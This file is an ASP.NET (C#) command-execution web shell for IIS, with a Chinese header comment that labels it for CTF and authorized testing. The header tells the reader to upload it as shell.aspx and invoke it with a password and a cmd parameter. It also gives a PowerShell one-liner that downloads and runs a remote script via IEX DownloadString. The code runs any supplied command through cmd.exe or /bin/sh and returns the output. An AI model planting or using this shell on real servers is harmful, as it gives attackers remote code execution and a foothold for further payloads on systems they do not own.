<%--
脚本名称: ASP.NET (C#) 命令执行 WebShell（IIS / aspx）
方向: Web（文件上传 / 解析 / RCE）
简介:
  - GET/POST 参数 cmd 执行系统命令并回显；
  - 参数 pwd 为口令（默认 ctf，建议修改）；
  - 适用于 IIS 上传 aspx、UNC/短文件、编辑器漏洞落地后。
用法:
  1) 修改 PWD；
  2) 保存为 shell.aspx 上传到可解析目录；
  3) http://target/shell.aspx?pwd=ctf&cmd=whoami
  PowerShell 反弹示例（URL 编码后）:
     cmd=powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
注意: 仅限授权测试与 CTF 靶场。
--%>
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    static string PWD = "ctf";
    void Run(object sender, EventArgs e) {
        if (Request["pwd"] != PWD) { Response.StatusCode = 404; return; }
        string cmd = Request["cmd"] ?? "";
        bool win = Environment.OSVersion.Platform.ToString().Contains("Win");
        var psi = new ProcessStartInfo {
            FileName = win ? "cmd.exe" : "/bin/sh",
            Arguments = (win ? "/c " : "-c ") + cmd,
            RedirectStandardOutput = true, RedirectStandardError = true,
            UseShellExecute = false,
            StandardOutputEncoding = System.Text.Encoding.UTF8
        };
        var p = Process.Start(psi);
        Out.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit(30000);
    }
</script>
<form runat="server">
  <asp:Button ID="Go" runat="server" Text="run" OnClick="Run" />
  <pre><asp:Literal ID="Out" runat="server" /></pre>
</form>
